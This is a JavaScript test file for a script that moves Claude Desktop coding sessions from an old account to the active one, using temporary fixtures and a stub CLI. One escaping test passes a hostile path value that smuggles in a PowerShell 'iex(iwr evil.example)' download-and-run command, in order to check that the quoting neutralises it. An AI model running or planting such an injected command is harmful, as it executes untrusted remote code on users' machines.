#!/usr/bin/env node
// desktop-sessions.test.mjs — offline tests for desktop-sessions.mjs. Every test builds its own fixture: a fake Claude
// Desktop app folder (config.json plus claude-code-sessions/<account>/<org>/local_*.json), a fake ~/.claude with
// transcripts, and a stub CLI that plays `claude --desktop --resume`. No test reads or writes the real app folder.
//
// Run:  node --test plugins/lt-dev/scripts/desktop-sessions.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  carrySession,
  findCandidates,
  groupFamilies,
  hookReport,
  lastAssistantText,
  powershellCommand,
  readActiveAccount,
  resolveAppDir,
} from './desktop-sessions.mjs';

const SCRIPT = path.join(path.dirname(fileURLToPath(import.meta.url)), 'desktop-sessions.mjs');
const ACTIVE = 'acc-active';
const OLD = 'acc-old';
const DAY = 86_400_000;
// The CLI tests run the script against the real clock, so the fixtures are dated against it too.
const NOW = Date.now();

let seq = 0;
const uuid = () => `00000000-0000-4000-8000-${String(++seq).padStart(12, '0')}`;

/** A fresh fixture: app folder, config folder, a project folder, and helpers to add sessions and transcripts. */
function fixture() {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'desktop-sessions-')));
  const appDir = path.join(root, 'app');
  const configDir = path.join(root, 'config');
  const project = path.join(root, 'project');
  fs.mkdirSync(path.join(appDir, 'claude-code-sessions', ACTIVE, 'org-a'), { recursive: true });
  fs.mkdirSync(path.join(configDir, 'projects', 'p1'), { recursive: true });
  fs.mkdirSync(project, { recursive: true });
  fs.writeFileSync(
    path.join(appDir, 'config.json'),
    JSON.stringify({ lastKnownAccountUuid: ACTIVE, 'oauth:tokenCache': 'SECRET-TOKEN-VALUE' }),
  );
  const session = (account, fields = {}, { transcript = true, file } = {}) => {
    const cliSessionId = fields.cliSessionId ?? uuid();
    const desktopId = file ?? `local_${uuid()}`;
    const dir = path.join(appDir, 'claude-code-sessions', account, account === ACTIVE ? 'org-a' : 'org-b');
    fs.mkdirSync(dir, { recursive: true });
    const data = {
      cliSessionId,
      cwd: project,
      isArchived: false,
      lastActivityAt: NOW - DAY,
      originCwd: project,
      sessionId: desktopId,
      title: 'Eine Session',
      ...fields,
    };
    fs.writeFileSync(path.join(dir, `${desktopId}.json`), JSON.stringify(data));
    if (transcript) {
      fs.writeFileSync(
        path.join(configDir, 'projects', 'p1', `${cliSessionId}.jsonl`),
        `${JSON.stringify({ type: 'user', message: { content: 'hallo' } })}\n`,
      );
    }
    return { cliSessionId, desktopId, data };
  };
  return { appDir, configDir, project, root, session };
}

test('resolveAppDir follows the override, then macOS and Windows defaults', () => {
  assert.equal(resolveAppDir({ env: { LT_DESKTOP_APP_DIR: '/x' }, home: '/h', platform: 'darwin' }), '/x');
  assert.equal(
    resolveAppDir({ env: {}, home: '/h', platform: 'darwin' }),
    path.join('/h', 'Library', 'Application Support', 'Claude'),
  );
  assert.equal(resolveAppDir({ env: { APPDATA: 'C:/R' }, home: '/h', platform: 'win32' }), path.join('C:/R', 'Claude'));
  assert.equal(resolveAppDir({ env: {}, home: '/h', platform: 'linux' }), null);
});

test('readActiveAccount returns only lastKnownAccountUuid, never anything else from config.json', () => {
  const f = fixture();
  assert.equal(readActiveAccount(f.appDir), ACTIVE);
  assert.equal(readActiveAccount(path.join(f.root, 'missing')), null);
});

test('findCandidates keeps recent, unarchived sessions of other accounts that are missing here', () => {
  const f = fixture();
  const keep = f.session(OLD, { title: 'Behalten' });
  f.session(OLD, { isArchived: true, title: 'Archiviert' });
  f.session(OLD, { lastActivityAt: NOW - 9 * DAY, title: 'Zu alt' });
  f.session(OLD, { title: 'Ohne Transkript' }, { transcript: false });
  f.session(OLD, { cwd: path.join(f.root, 'gone'), originCwd: path.join(f.root, 'gone'), title: 'Ohne Ordner' });
  const carriedByFile = f.session(OLD, { title: 'Schon da (Datei)' });
  f.session(ACTIVE, { cliSessionId: carriedByFile.cliSessionId }, { file: `local_${carriedByFile.cliSessionId}` });
  const carriedByLastAssistant = f.session(OLD, { title: 'Schon da (lastAssistant)' });
  f.session(ACTIVE, { lastAssistantCliSessionId: carriedByLastAssistant.cliSessionId });

  const result = findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW });
  assert.equal(result.active, ACTIVE);
  assert.deepEqual(
    result.candidates.map((c) => c.title),
    ['Behalten'],
  );
  assert.equal(result.candidates[0].cliSessionId, keep.cliSessionId);
  assert.deepEqual(result.skipped, { alreadyActive: 2, archived: 1, noCwd: 1, noTranscript: 1, tooOld: 1 });
});

test('findCandidates prefers originCwd and carries the context Kai chooses by', () => {
  const f = fixture();
  const other = path.join(f.root, 'other');
  fs.mkdirSync(other);
  f.session(OLD, {
    cwd: other,
    error: "You've hit your weekly limit",
    lastTurnReport: 'x'.repeat(1000),
    originCwd: f.project,
    prs: [{ branch: 'feature/a', state: 'open', url: 'https://example.test/pr/1' }],
    queuedSideSessionNotes: [{ body: 'Noch offen', sessionId: 'local_child' }],
    sideSessionNotes: [{ report: 'Bericht der Sub-Session', title: 'Kind' }],
    title: 'Mit Kontext',
    writtenBranches: ['feature/a'],
  });
  const [c] = findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW }).candidates;
  assert.equal(c.cwd, f.project);
  assert.equal(c.error, "You've hit your weekly limit");
  assert.ok(c.lastTurnReport.length <= 401, 'long reports are cut');
  assert.deepEqual(c.prs, [{ branch: 'feature/a', state: 'open', url: 'https://example.test/pr/1' }]);
  assert.deepEqual(c.writtenBranches, ['feature/a']);
  assert.deepEqual(c.sideReports, [{ report: 'Bericht der Sub-Session', title: 'Kind' }]);
  assert.equal(c.queuedNotes.length, 1);
  assert.equal(c.lastAssistant, null, 'the transcript has no assistant message yet');
});

test('lastAssistantText reads the newest assistant text from the end of a large transcript', () => {
  const f = fixture();
  const file = path.join(f.root, 't.jsonl');
  const lines = [];
  for (let i = 0; i < 2000; i++) lines.push(JSON.stringify({ type: 'user', message: { content: 'f'.repeat(200) } }));
  lines.push(JSON.stringify({ type: 'assistant', message: { content: [{ text: 'Erste Antwort', type: 'text' }] } }));
  lines.push(JSON.stringify({ type: 'assistant', message: { content: [{ name: 'Bash', type: 'tool_use' }] } }));
  lines.push(JSON.stringify({ type: 'assistant', message: { content: [{ text: 'Letzte Antwort', type: 'text' }] } }));
  lines.push(JSON.stringify({ type: 'user', message: { content: [{ type: 'tool_result' }] } }));
  fs.writeFileSync(file, `${lines.join('\n')}\n`);
  assert.equal(lastAssistantText(file, { maxBytes: 4096 }), 'Letzte Antwort');
  assert.equal(lastAssistantText(path.join(f.root, 'missing.jsonl')), null);
});

test('groupFamilies keeps a main session and its sub-sessions together, main first', () => {
  const f = fixture();
  const main = f.session(OLD, { title: 'Main' });
  f.session(OLD, { spawnedFrom: { name: 'kind-a', sessionId: main.desktopId, sideSession: true }, title: 'Kind A' });
  f.session(OLD, { title: 'Allein' });
  const result = findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW });
  const families = groupFamilies(result);
  const withMain = families.find((x) => x.main?.title === 'Main');
  assert.deepEqual(
    withMain.children.map((c) => c.title),
    ['Kind A'],
  );
  assert.equal(withMain.children[0].name, 'kind-a');
  assert.ok(families.some((x) => x.main?.title === 'Allein' && x.children.length === 0));
});

test('groupFamilies names the new id of a main session that is already in the active account', () => {
  const f = fixture();
  const main = f.session(OLD, { title: 'Main' });
  f.session(ACTIVE, { cliSessionId: main.cliSessionId, title: 'Main' }, { file: `local_${main.cliSessionId}` });
  f.session(OLD, { spawnedFrom: { name: 'kind', sessionId: main.desktopId }, title: 'Kind' });
  const families = groupFamilies(findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW }));
  assert.equal(families.length, 1);
  assert.equal(families[0].main, null);
  assert.deepEqual(families[0].mainElsewhere, { desktopId: `local_${main.cliSessionId}`, title: 'Main' });
});

/** A stub CLI: it records its arguments and plays one outcome of `claude --desktop --resume <id>`. */
function stubCli(f, behaviour) {
  const stub = path.join(f.root, `stub-${behaviour}.mjs`);
  const target = path.join(f.appDir, 'claude-code-sessions', ACTIVE, 'org-a');
  fs.writeFileSync(
    stub,
    `import fs from 'node:fs'; import path from 'node:path';
const id = process.argv[process.argv.indexOf('--resume') + 1];
fs.writeFileSync(${JSON.stringify(path.join(f.root, 'stub-args.json'))}, JSON.stringify({ argv: process.argv.slice(2), cwd: process.cwd() }));
const b = ${JSON.stringify(behaviour)};
if (b === 'open') { console.log('Session ' + id + ' is open in another terminal. Run /desktop there instead.'); process.exit(1); }
if (b === 'fail') { console.error('boom'); process.exit(3); }
if (b === 'silent') process.exit(0);
const cwd = b === 'elsewhere' ? ${JSON.stringify(f.root)} : process.cwd();
fs.writeFileSync(path.join(${JSON.stringify(target)}, 'local_' + id + '.json'), JSON.stringify({ cliSessionId: id, cwd }));
`,
  );
  return stub;
}

test('carrySession hands over in the original folder and verifies the new entry', () => {
  const f = fixture();
  f.session(OLD, { title: 'Weg' });
  const [c] = findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW }).candidates;
  // The handover path is tested on every OS; Windows itself takes the manual path (next test but one).
  const r = carrySession(c, {
    active: ACTIVE,
    appDir: f.appDir,
    bin: stubCli(f, 'ok'),
    platform: 'darwin',
    usePty: false,
    waitMs: 2000,
  });
  assert.equal(r.status, 'carried', r.detail);
  assert.equal(r.newDesktopId, `local_${c.cliSessionId}`);
  const seen = JSON.parse(fs.readFileSync(path.join(f.root, 'stub-args.json'), 'utf8'));
  assert.deepEqual(seen.argv, ['--desktop', '--resume', c.cliSessionId]);
  assert.equal(fs.realpathSync(seen.cwd), f.project);
});

test('carrySession reports a session open in a terminal, a wrong folder, a failure and a missing entry', () => {
  const f = fixture();
  f.session(OLD, { title: 'Weg' });
  const [c] = findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW }).candidates;
  const opts = { active: ACTIVE, appDir: f.appDir, platform: 'darwin', usePty: false, waitMs: 300 };
  assert.equal(carrySession(c, { ...opts, bin: stubCli(f, 'open') }).status, 'open-in-terminal');
  const failed = carrySession(c, { ...opts, bin: stubCli(f, 'fail') });
  assert.equal(failed.status, 'failed');
  assert.match(failed.detail, /boom/);
  assert.equal(carrySession(c, { ...opts, bin: stubCli(f, 'silent') }).status, 'failed');
  const moved = carrySession(c, { ...opts, bin: stubCli(f, 'elsewhere') });
  assert.equal(moved.status, 'cwd-mismatch');
});

test('carrySession on Windows hands back the PowerShell command instead of running it', () => {
  const f = fixture();
  f.session(OLD, { title: 'Weg' });
  const [c] = findCandidates({ appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW }).candidates;
  const r = carrySession(c, { active: ACTIVE, appDir: f.appDir, bin: 'claude', platform: 'win32' });
  assert.equal(r.status, 'manual');
  assert.equal(r.command, powershellCommand(c.cwd, c.cliSessionId));
  assert.equal(powershellCommand("C:/it's", 'abc'), "Set-Location -LiteralPath 'C:/it''s'; claude --desktop --resume abc");
  // PowerShell also ends the literal at the typographic quotes U+2018 to U+201B.
  assert.equal(
    powershellCommand('C:/Kai’s Projekte', 'abc'),
    "Set-Location -LiteralPath 'C:/Kai’’s Projekte'; claude --desktop --resume abc",
  );
  const hostile = powershellCommand('C:/x’; iex(iwr evil.example).Content; ‘y‚z‛', 'abc');
  assert.equal(
    hostile,
    "Set-Location -LiteralPath 'C:/x’’; iex(iwr evil.example).Content; ‘‘y‚‚z‛‛'; claude --desktop --resume abc",
  );
});

test('hookReport names new candidates once, caps the list, and stays silent afterwards', () => {
  const f = fixture();
  for (let i = 1; i <= 7; i++) f.session(OLD, { title: `Session ${i}` });
  const stateFile = path.join(f.root, 'state', 'announced.json');
  const opts = { appDir: f.appDir, configDir: f.configDir, days: 7, now: NOW, stateFile };
  const first = JSON.parse(hookReport(opts));
  const context = first.hookSpecificOutput.additionalContext;
  assert.equal(first.hookSpecificOutput.hookEventName, 'SessionStart');
  assert.match(context, /7 Sessions/);
  assert.match(context, /\/lt-dev:desktop-sessions/);
  assert.match(context, /und 2 weitere/, 'a capped list says how many it left out');
  assert.doesNotMatch(context, /SECRET/);
  assert.equal(hookReport(opts), null, 'every session is named only once');
  f.session(OLD, { title: 'Neu dazu' });
  assert.match(JSON.parse(hookReport(opts)).hookSpecificOutput.additionalContext, /1 Session\b.*Neu dazu/s);
});

test('hookReport is silent without another account', () => {
  const f = fixture();
  f.session(ACTIVE, { title: 'Hier' });
  assert.equal(
    hookReport({ appDir: f.appDir, configDir: f.configDir, now: NOW, stateFile: path.join(f.root, 's.json') }),
    null,
  );
});

/** The CLI exactly as the command calls it. */
function cli(f, args) {
  return spawnSync(process.execPath, [SCRIPT, ...args], {
    encoding: 'utf8',
    env: { ...process.env, CLAUDE_CONFIG_DIR: f.configDir, LT_DESKTOP_APP_DIR: f.appDir },
  });
}

test('the CLI lists candidates as JSON and refuses to carry without an explicit selection', () => {
  const f = fixture();
  const s = f.session(OLD, { title: 'Liste' });
  const list = cli(f, ['list', '--json']);
  assert.equal(list.status, 0, list.stderr);
  const parsed = JSON.parse(list.stdout);
  assert.equal(parsed.families[0].main.cliSessionId, s.cliSessionId);
  assert.doesNotMatch(list.stdout, /SECRET/);

  const none = cli(f, ['carry']);
  assert.equal(none.status, 2);
  assert.match(none.stderr, /--id/);

  const unknown = cli(f, ['carry', '--id', uuid()]);
  assert.equal(unknown.status, 2);
  assert.match(unknown.stderr, /kein Kandidat/);
});

test('the CLI carries a session picked from a wider list without repeating --days', () => {
  const f = fixture();
  const s = f.session(OLD, { lastActivityAt: Date.now() - 9 * DAY, title: 'Neun Tage alt' });
  const wide = JSON.parse(cli(f, ['list', '--json', '--days', '14']).stdout);
  assert.equal(wide.families[0].main.cliSessionId, s.cliSessionId);
  assert.equal(JSON.parse(cli(f, ['list', '--json']).stdout).families.length, 0, 'the default list stays at 7 days');
  const r = spawnSync(process.execPath, [SCRIPT, 'carry', '--id', s.cliSessionId, '--json', '--no-pty'], {
    encoding: 'utf8',
    env: {
      ...process.env,
      CLAUDE_CONFIG_DIR: f.configDir,
      LT_DESKTOP_APP_DIR: f.appDir,
      LT_DESKTOP_CARRY_WAIT_MS: '2000',
      LT_DESKTOP_CLAUDE_BIN: stubCli(f, 'ok'),
    },
  });
  assert.equal(r.status, 0, r.stderr);
  const [result] = JSON.parse(r.stdout).results;
  assert.equal(result.cliSessionId, s.cliSessionId);
  assert.equal(result.status, process.platform === 'win32' ? 'manual' : 'carried');
});

test('the CLI carries the selected sessions, main sessions first', () => {
  const f = fixture();
  const main = f.session(OLD, { title: 'Main' });
  const child = f.session(OLD, { spawnedFrom: { name: 'kind', sessionId: main.desktopId }, title: 'Kind' });
  const notPicked = f.session(OLD, { title: 'Nicht gewählt' });
  const r = spawnSync(
    process.execPath,
    [SCRIPT, 'carry', '--id', child.cliSessionId, '--id', main.cliSessionId, '--json', '--no-pty'],
    {
      encoding: 'utf8',
      env: {
        ...process.env,
        CLAUDE_CONFIG_DIR: f.configDir,
        LT_DESKTOP_APP_DIR: f.appDir,
        LT_DESKTOP_CLAUDE_BIN: stubCli(f, 'ok'),
        LT_DESKTOP_CARRY_WAIT_MS: '2000',
      },
    },
  );
  assert.equal(r.status, 0, r.stderr);
  const out = JSON.parse(r.stdout);
  assert.equal(out.results.length, 2, 'only the picked sessions are handled');
  assert.ok(
    !fs.existsSync(path.join(f.appDir, 'claude-code-sessions', ACTIVE, 'org-a', `local_${notPicked.cliSessionId}.json`)),
    'a session the user did not pick stays where it is',
  );
  if (process.platform === 'win32') {
    // Windows hands back one PowerShell command per session instead of running it.
    assert.deepEqual(
      out.results.map((x) => [x.title, x.status]),
      [
        ['Main', 'manual'],
        ['Kind', 'manual'],
      ],
    );
    return;
  }
  assert.deepEqual(
    out.results.map((x) => [x.title, x.status]),
    [
      ['Main', 'carried'],
      ['Kind', 'carried'],
    ],
  );
  assert.equal(out.results[1].parentNewDesktopId, `local_${main.cliSessionId}`);
});
